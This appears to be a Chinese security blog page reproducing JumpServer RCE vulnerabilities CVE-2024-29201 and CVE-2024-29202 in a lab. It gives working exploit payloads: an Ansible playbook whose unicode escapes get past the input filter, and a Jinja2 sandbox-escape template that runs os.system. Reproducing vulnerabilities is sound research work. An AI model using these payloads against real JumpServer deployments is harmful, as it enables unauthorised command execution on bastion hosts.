@@ -1,0 +1,129 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="JumpServer远程代码执行漏洞（CVE-2024-29201&amp;CVE-2024-29202）                           影响版本       v3.0.0 &lt;&#x3D; JumpServer &lt;&#x3D; v3.10.6                     环境搭建       从链接下载启动文件 https:&#x2F;&#x2F;re">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JumpServer远程代码执行漏洞（CVE-2024-29201&amp;CVE-2024-29202）">
+<meta property="og:url" content="https://pidan-007.github.io/2024/07/08/JumpServer%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="PiDan-007">
+<meta property="og:description" content="JumpServer远程代码执行漏洞（CVE-2024-29201&amp;CVE-2024-29202）                           影响版本       v3.0.0 &lt;&#x3D; JumpServer &lt;&#x3D; v3.10.6                     环境搭建       从链接下载启动文件 https:&#x2F;&#x2F;re">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407050956702.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407050959496.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407051455358.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407051457766.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091416395.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091415846.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091329987.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091330135.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091331559.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091335977.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091337206.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091338542.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091343812.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091348927.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091349976.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091351196.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091359489.png">
+<meta property="article:published_time" content="2024-07-08T02:25:47.000Z">
+<meta property="article:modified_time" content="2024-07-12T02:01:32.373Z">
+<meta property="article:author" content="PiDan-007">
+<meta property="article:tag" content="CVE-2024-29201&amp;CVE-2024-29202漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407050956702.png"><title>JumpServer远程代码执行漏洞（CVE-2024-29201&amp;CVE-2024-29202） | PiDan-007</title><link ref="canonical" href="https://pidan-007.github.io/2024/07/08/JumpServer%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PiDan-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">JumpServer远程代码执行漏洞（CVE-2024-29201&amp;CVE-2024-29202）</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-07-08</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-07-12</span></span></div></header><div class="post-body">
+        <h1 id="JumpServer远程代码执行漏洞（CVE-2024-29201-amp-CVE-2024-29202）"   >
+          <a href="#JumpServer远程代码执行漏洞（CVE-2024-29201-amp-CVE-2024-29202）" class="heading-link"><i class="fas fa-link"></i></a><a href="#JumpServer远程代码执行漏洞（CVE-2024-29201-amp-CVE-2024-29202）" class="headerlink" title="JumpServer远程代码执行漏洞（CVE-2024-29201&amp;CVE-2024-29202）"></a>JumpServer远程代码执行漏洞（CVE-2024-29201&amp;CVE-2024-29202）</h1>
+      
+        <h3 id="影响版本"   >
+          <a href="#影响版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3>
+      <p>v3.0.0 &lt;= JumpServer &lt;= v3.10.6</p>
+
+        <h3 id="环境搭建"   >
+          <a href="#环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3>
+      <p>从链接下载启动文件</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://resource.fit2cloud.com/jumpserver/jumpserver/releases/latest/download/quick_start.sh" >https://resource.fit2cloud.com/jumpserver/jumpserver/releases/latest/download/quick_start.sh</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>之后打开编辑<code>VERSION</code>为v3.10.6或影响版本中更低的，保存文件</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407050956702.png" alt="image-20240705095611597"></p>
+<p>准备运行</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x quick_start.sh</span><br><span class="line">sudo ./quick_start.sh</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407050959496.png" alt="image-20240705095901445"></p>
+<p>服务启动（可能会比较慢）后，访问</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip/core/auth/login/</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407051455358.png" alt="image-20240705145517135"></p>
+<p>JumpServer 默认账号密码为 <code>admin/admin</code></p>
+<p>（登录后甚至还提醒我密码太简单，让我修改，然后我修改成了123456）</p>
+<p>接着进入后台添加资产</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407051457766.png" alt="image-20240705145744685"></p>
+<p>添加资产，我这里是添加的我的另一台虚拟机的IP，并且只保留了ssh协议</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091416395.png" alt="image-20240709141630334"></p>
+<p>必须要添加账号，要输入密码，这里输入的是我另一台虚拟机的密码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091415846.png" alt="image-20240709141526790"></p>
+<p>添加资产后需要测试是否添加成功，点击资产后面的 <code>更多-测试</code> 进行测试，这是成功样式</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091329987.png" alt="image-20240709132944785"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091330135.png" alt="image-20240709133016103"></p>
+<p>再创建一个用户</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091331559.png" alt="image-20240709133155501"></p>
+<p>用户组选择<code>Default</code>，然后填好必填项，设置好密码，创建了用户名为user的用户</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091335977.png" alt="image-20240709133539935"></p>
+<p>再为用户分配资产</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091337206.png" alt="image-20240709133704125"></p>
+<p>创建好后如图</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091338542.png" alt="image-20240709133835498"></p>
+<p>环境搭建完成</p>
+
+        <h3 id="CVE-2024-29201"   >
+          <a href="#CVE-2024-29201" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2024-29201" class="headerlink" title="CVE-2024-29201"></a>CVE-2024-29201</h3>
+      <p>退出管理员账号，登录刚刚创建的user/123456，进入 <code>作业中心-模板管理</code> 添加一个 <code>playbook</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091343812.png" alt="image-20240709134328742"></p>
+<p>创建好<code>palybook</code>名称后，点击创建的<code>palybook</code>切换到 <code>工作空间</code>，输入以下内容：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[&#123;</span><br><span class="line">     &quot;name&quot;: &quot;RCE playbook&quot;,</span><br><span class="line">     &quot;hosts&quot;: &quot;all&quot;,</span><br><span class="line">     &quot;tasks&quot;: [</span><br><span class="line">       &#123;</span><br><span class="line">         &quot;name&quot;: &quot;this runs in Celery container&quot;,</span><br><span class="line">         &quot;shell&quot;: &quot;id &gt; /tmp/test&quot;,</span><br><span class="line">         &quot;\u0064elegate_to&quot;: &quot;localhost&quot;</span><br><span class="line">&#125; ],</span><br><span class="line">     &quot;vars&quot;: &#123;</span><br><span class="line">     &quot;ansible_\u0063onnection&quot;: &quot;local&quot;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;]</span><br></pre></td></tr></table></div></figure>
+
+<p>点击保存，再切换到 <code>作业管理</code> 页面，创建一个新的 <code>Playbook</code> 作业</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091348927.png" alt="image-20240709134803857"></p>
+<p>详情填写</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091349976.png" alt="image-20240709134935933"></p>
+<p>保存后，再点击<code>更多-运行</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091351196.png" alt="image-20240709135116145"></p>
+<p>之后再进入这个celery容器，然后查看/tmp文件目录</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps</span><br><span class="line">sudo docker exec -i docker-id /bin/bash</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091359489.png" alt="image-20240709135914433"></p>
+<p>命令执行成功</p>
+
+        <h3 id="CVE-2024-29202"   >
+          <a href="#CVE-2024-29202" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2024-29202" class="headerlink" title="CVE-2024-29202"></a>CVE-2024-29202</h3>
+      <p>与类似，只是<code>playbook</code>的<code>工作空间</code>里的内容换成</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- name: |</span><br><span class="line">       &#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">         &#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="line">           &#123;&#123;</span><br><span class="line">             x()._module.__builtins__[&quot;__import__&quot;](&quot;os&quot;).system(&quot;id &gt; /tmp/test2&quot;)</span><br><span class="line">           &#125;&#125;</span><br><span class="line">         &#123;%endif%&#125;</span><br><span class="line">       &#123;%endfor%&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>其余步骤相同</p>
+<p>参考：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wh0am1i.com/2024/03/30/JumpServer-CVE-2024-29201-CVE-2024-29202/index.html" >https://wh0am1i.com/2024/03/30/JumpServer-CVE-2024-29201-CVE-2024-29202/index.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="https://pidan-007.github.io">PiDan-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="https://pidan-007.github.io/2024/07/08/JumpServer%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">https://pidan-007.github.io/2024/07/08/JumpServer%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://pidan-007.github.io/tags/CVE-2024-29201-CVE-2024-29202%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">CVE-2024-29201&amp;CVE-2024-29202漏洞复现</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2024/07/10/HFS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Rejetto HFS 远程命令执行漏洞(CVE-2024-39943)</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2024/07/05/lylme_spage%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><span class="paginator-prev__text">六零导航页file.php任意文件上传漏洞（CVE-2024-34982）</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JumpServer%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-29201-amp-CVE-2024-29202%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">
+          JumpServer远程代码执行漏洞（CVE-2024-29201&amp;CVE-2024-29202）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.0.1.</span> <span class="toc-text">
+          影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.0.2.</span> <span class="toc-text">
+          环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-29201"><span class="toc-number">1.0.3.</span> <span class="toc-text">
+          CVE-2024-29201</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-29202"><span class="toc-number">1.0.4.</span> <span class="toc-text">
+          CVE-2024-29202</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">13</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PiDan-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
